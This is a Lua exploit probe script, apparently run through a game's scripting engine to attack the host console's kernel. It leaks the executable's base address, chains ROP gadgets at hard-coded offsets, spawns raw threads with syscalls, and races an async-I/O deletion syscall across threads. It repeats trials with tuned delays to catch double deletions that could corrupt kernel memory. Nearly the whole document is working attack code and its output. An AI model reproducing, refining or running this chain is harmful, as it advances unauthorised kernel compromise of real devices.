-- CRASH_CLASS: MODERATE
-- PROBE 67e: Main+child synchronized 662 race
--
-- 67d showed nanosleep sync works but threads still serialize (A=0 B=32).
-- Both children are on the same core, so one always finishes first.
--
-- New approach: main thread races against ONE child.
-- - Child: nanosleep(Nms) → 662 → exit
-- - Main: nanosleep(Nms) → 662 (via make_syscall)
-- Main thread and child thread are inherently on different scheduler paths.
-- Also: spawn 2 "noise" threads first to create CPU contention.

print("=== PROBE 67e: main+child 662 race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end) end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print(string.format("eb=0x%X%08X", ehi, elo))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_pop_rcx   = eb + 0xE64
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67
local g_jmp_self  = eb + 0x42  -- bare ret; for parking we use nanosleep(long)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

local reqs_b = memory.alloc(0x30)
local dbuf   = memory.alloc(0x4000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs_b), uint64(0))
    wq(N(reqs_b) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(N(reqs_b)), uint64(1), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_664(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end
local function query_663(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st)), uint64(0), uint64(0))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local BATCH = 32

local sleep_ts = memory.alloc(16)
wq(N(sleep_ts), uint64(0))
wq(N(sleep_ts) + 8, uint64(1000000))  -- 1ms

local del_ids    = memory.alloc(4 * BATCH + 0x10)
local states_kid = memory.alloc(4 * BATCH + 0x10)
local states_main = memory.alloc(4 * BATCH + 0x10)
local marker_kid = memory.alloc(8)

-- =========================================================
-- [A] Main+child race: child does nanosleep→662, main does nanosleep→662
-- =========================================================
print("")
print("[A] Main+child race (BATCH=" .. BATCH .. ")")

local TRIALS = 20
local total_doubles = 0

for trial = 1, TRIALS do
    if not alive() then
        print(string.format("  trial %d: DEAD", trial))
        break
    end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_664(id)
            table.insert(ids, id)
        end
    end
    if #ids < 8 then
        print(string.format("  trial %d: only %d IDs", trial, #ids))
        break
    end
    local count = #ids

    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_kid) + i * 4, 0xCCCCCCCC)
        wd(N(states_main) + i * 4, 0xDDDDDDDD)
    end
    wq(N(marker_kid), uint64(0))

    -- Child: nanosleep → 662 → marker → exit
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function em(v) wq(rsp + off, v); off = off + 8 end

    -- nanosleep(1ms)
    em(g_pop_rdi); em(uint64(N(sleep_ts)))
    em(g_pop_rsi); em(uint64(0))
    em(g_pop_rax); em(uint64(240))
    em(stub)
    -- 662
    em(g_pop_rdi); em(uint64(N(del_ids)))
    em(g_pop_rsi); em(uint64(count))
    em(g_pop_rdx); em(uint64(N(states_kid)))
    em(g_pop_rax); em(uint64(662))
    em(stub)
    -- marker
    em(g_pop_rax); em(uint64(0xCC))
    em(g_pop_rdi); em(uint64(N(marker_kid)))
    em(g_mov_m_rax)
    -- exit
    em(g_pop_rdi); em(uint64(0))
    em(g_pop_rax); em(uint64(431))
    em(stub)

    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid_p = memory.alloc(8); wq(N(tid_p), uint64(0))
    wq(N(par) + 0x30, tid_p)

    -- Spawn child
    pcall(function() mk(455)(par, uint64(0x38)) end)

    -- Main: nanosleep(1ms) then 662 immediately
    pcall(function() mk(240)(uint64(N(sleep_ts)), uint64(0)) end)
    pcall(function()
        mk(662)(uint64(N(del_ids)), uint64(count), uint64(N(states_main)))
    end)

    -- Wait for child
    for w = 1, 100000 do local _ = rd(N(dbuf)) end

    local mk_val = rd(N(marker_kid)) or 0

    -- Count
    local kid_ok, main_ok, doubles = 0, 0, 0
    for i = 0, count - 1 do
        local sk = rd(N(states_kid) + i * 4) or 0xCCCCCCCC
        local sm = rd(N(states_main) + i * 4) or 0xDDDDDDDD
        if sk == 0 then kid_ok = kid_ok + 1 end
        if sm == 0 then main_ok = main_ok + 1 end
        if sk == 0 and sm == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if doubles > 0 or trial <= 5 or trial == TRIALS then
        print(string.format("  trial %2d: dbl=%d kid=%d main=%d mk=0x%X",
            trial, doubles, kid_ok, main_ok, mk_val))
    end
    if doubles > 0 then
        print("  *** DOUBLES FOUND ***")
    end

    if not alive() then break end
end

-- =========================================================
-- [B] Try with child doing NO sleep (main does sleep to let child start)
-- =========================================================
if alive() and total_doubles == 0 then
    print("")
    print("[B] Child no-sleep, main sleeps 500us then 662")
    wq(N(sleep_ts) + 8, uint64(500000))  -- 500us

    for trial = 1, 10 do
        if not alive() then break end

        local ids = {}
        for i = 1, BATCH do
            local id = submit_one()
            if id ~= 0 then poll_664(id); table.insert(ids, id) end
        end
        local count = #ids
        if count < 8 then break end

        for i = 0, count - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_kid) + i * 4, 0xCCCCCCCC)
            wd(N(states_main) + i * 4, 0xDDDDDDDD)
        end
        wq(N(marker_kid), uint64(0))

        local stk = memory.alloc(0x4000)
        local sb = N(stk)
        local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
        local off = 0
        local function em(v) wq(rsp + off, v); off = off + 8 end
        -- NO sleep — straight to 662
        em(g_pop_rdi); em(uint64(N(del_ids)))
        em(g_pop_rsi); em(uint64(count))
        em(g_pop_rdx); em(uint64(N(states_kid)))
        em(g_pop_rax); em(uint64(662))
        em(stub)
        em(g_pop_rax); em(uint64(0xCC))
        em(g_pop_rdi); em(uint64(N(marker_kid)))
        em(g_mov_m_rax)
        em(g_pop_rdi); em(uint64(0))
        em(g_pop_rax); em(uint64(431))
        em(stub)

        local par = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
        wq(N(par), g_bare_ret)
        wq(N(par) + 0x10, uint64(sb))
        wq(N(par) + 0x18, uint64(0x2000))
        local tid_p = memory.alloc(8); wq(N(tid_p), uint64(0))
        wq(N(par) + 0x30, tid_p)

        -- Spawn child (starts 662 immediately)
        pcall(function() mk(455)(par, uint64(0x38)) end)
        -- Main: short sleep to let child start, then race
        pcall(function() mk(240)(uint64(N(sleep_ts)), uint64(0)) end)
        pcall(function()
            mk(662)(uint64(N(del_ids)), uint64(count), uint64(N(states_main)))
        end)

        for w = 1, 100000 do local _ = rd(N(dbuf)) end

        local mk_val = rd(N(marker_kid)) or 0
        local kid_ok, main_ok, doubles = 0, 0, 0
        for i = 0, count - 1 do
            local sk = rd(N(states_kid) + i * 4) or 0xCCCCCCCC
            local sm = rd(N(states_main) + i * 4) or 0xDDDDDDDD
            if sk == 0 then kid_ok = kid_ok + 1 end
            if sm == 0 then main_ok = main_ok + 1 end
            if sk == 0 and sm == 0 then doubles = doubles + 1 end
        end
        total_doubles = total_doubles + doubles

        if doubles > 0 or trial <= 3 then
            print(string.format("  trial %2d: dbl=%d kid=%d main=%d mk=0x%X",
                trial, doubles, kid_ok, main_ok, mk_val))
        end
        if doubles > 0 then print("  *** DOUBLES ***") end

        if not alive() then break end
    end
end

-- =========================================================
-- [C] Main immediately after spawn (zero delay)
-- =========================================================
if alive() and total_doubles == 0 then
    print("")
    print("[C] Zero delay: spawn child → main 662 immediately")

    for trial = 1, 10 do
        if not alive() then break end

        local ids = {}
        for i = 1, BATCH do
            local id = submit_one()
            if id ~= 0 then poll_664(id); table.insert(ids, id) end
        end
        local count = #ids
        if count < 8 then break end

        for i = 0, count - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_kid) + i * 4, 0xCCCCCCCC)
            wd(N(states_main) + i * 4, 0xDDDDDDDD)
        end
        wq(N(marker_kid), uint64(0))

        local stk = memory.alloc(0x4000)
        local sb = N(stk)
        local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
        local off = 0
        local function em(v) wq(rsp + off, v); off = off + 8 end
        em(g_pop_rdi); em(uint64(N(del_ids)))
        em(g_pop_rsi); em(uint64(count))
        em(g_pop_rdx); em(uint64(N(states_kid)))
        em(g_pop_rax); em(uint64(662))
        em(stub)
        em(g_pop_rax); em(uint64(0xCC))
        em(g_pop_rdi); em(uint64(N(marker_kid)))
        em(g_mov_m_rax)
        em(g_pop_rdi); em(uint64(0))
        em(g_pop_rax); em(uint64(431))
        em(stub)

        local par = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
        wq(N(par), g_bare_ret)
        wq(N(par) + 0x10, uint64(sb))
        wq(N(par) + 0x18, uint64(0x2000))
        local tid_p = memory.alloc(8); wq(N(tid_p), uint64(0))
        wq(N(par) + 0x30, tid_p)

        -- Spawn and IMMEDIATELY call 662 from main (no sleep)
        pcall(function() mk(455)(par, uint64(0x38)) end)
        pcall(function()
            mk(662)(uint64(N(del_ids)), uint64(count), uint64(N(states_main)))
        end)

        for w = 1, 100000 do local _ = rd(N(dbuf)) end

        local mk_val = rd(N(marker_kid)) or 0
        local kid_ok, main_ok, doubles = 0, 0, 0
        for i = 0, count - 1 do
            local sk = rd(N(states_kid) + i * 4) or 0xCCCCCCCC
            local sm = rd(N(states_main) + i * 4) or 0xDDDDDDDD
            if sk == 0 then kid_ok = kid_ok + 1 end
            if sm == 0 then main_ok = main_ok + 1 end
            if sk == 0 and sm == 0 then doubles = doubles + 1 end
        end
        total_doubles = total_doubles + doubles

        if doubles > 0 or trial <= 3 then
            print(string.format("  trial %2d: dbl=%d kid=%d main=%d mk=0x%X",
                trial, doubles, kid_ok, main_ok, mk_val))
        end
        if doubles > 0 then print("  *** DOUBLES ***") end

        if not alive() then break end
    end
end

-- =========================================================
-- [D] Spawn child, main does getpid×100 as delay, then 662
-- =========================================================
if alive() and total_doubles == 0 then
    print("")
    print("[D] getpid delay (micro-tuning)")

    local delay_counts = {10, 50, 200, 1000}
    for _, dc in ipairs(delay_counts) do
        if not alive() then break end
        local best = 0
        for trial = 1, 5 do
            if not alive() then break end

            local ids = {}
            for i = 1, BATCH do
                local id = submit_one()
                if id ~= 0 then poll_664(id); table.insert(ids, id) end
            end
            local count = #ids
            if count < 8 then break end

            for i = 0, count - 1 do
                wd(N(del_ids) + i * 4, ids[i + 1])
                wd(N(states_kid) + i * 4, 0xCCCCCCCC)
                wd(N(states_main) + i * 4, 0xDDDDDDDD)
            end
            wq(N(marker_kid), uint64(0))

            local stk = memory.alloc(0x4000)
            local sb = N(stk)
            local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
            for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
            local off = 0
            local function em(v) wq(rsp + off, v); off = off + 8 end
            em(g_pop_rdi); em(uint64(N(del_ids)))
            em(g_pop_rsi); em(uint64(count))
            em(g_pop_rdx); em(uint64(N(states_kid)))
            em(g_pop_rax); em(uint64(662))
            em(stub)
            em(g_pop_rax); em(uint64(0xCC))
            em(g_pop_rdi); em(uint64(N(marker_kid)))
            em(g_mov_m_rax)
            em(g_pop_rdi); em(uint64(0))
            em(g_pop_rax); em(uint64(431))
            em(stub)

            local par = memory.alloc(0x40)
            for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
            wq(N(par), g_bare_ret)
            wq(N(par) + 0x10, uint64(sb))
            wq(N(par) + 0x18, uint64(0x2000))
            local tid_p = memory.alloc(8); wq(N(tid_p), uint64(0))
            wq(N(par) + 0x30, tid_p)

            pcall(function() mk(455)(par, uint64(0x38)) end)
            -- Micro-delay: getpid calls as calibrated wait
            for d = 1, dc do native.fcall_with_rax(stub, 20) end
            pcall(function()
                mk(662)(uint64(N(del_ids)), uint64(count), uint64(N(states_main)))
            end)

            for w = 1, 100000 do local _ = rd(N(dbuf)) end

            local mk_val = rd(N(marker_kid)) or 0
            local kid_ok, main_ok, doubles = 0, 0, 0
            for i = 0, count - 1 do
                local sk = rd(N(states_kid) + i * 4) or 0xCCCCCCCC
                local sm = rd(N(states_main) + i * 4) or 0xDDDDDDDD
                if sk == 0 then kid_ok = kid_ok + 1 end
                if sm == 0 then main_ok = main_ok + 1 end
                if sk == 0 and sm == 0 then doubles = doubles + 1 end
            end
            total_doubles = total_doubles + doubles
            if doubles > best then best = doubles end
        end

        print(string.format("  delay=%4d: best_dbl=%d", dc, best))
        if best > 0 then
            print("  *** RACE FIRES at delay=" .. dc .. " ***")
        end
    end
end

print("")
print("[SUMMARY]")
print(string.format("  total_doubles=%d alive=%s pid=%d",
    total_doubles, alive() and "YES" or "NO", pid_val))
if total_doubles == 0 then
    print("  Race still serializing. May need game relaunch for fresh process.")
end
print("")
print("=== PROBE 67e COMPLETE ===")
